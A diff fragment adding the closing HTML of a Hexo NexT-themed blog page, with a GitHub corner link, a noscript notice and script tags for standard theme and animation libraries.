+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
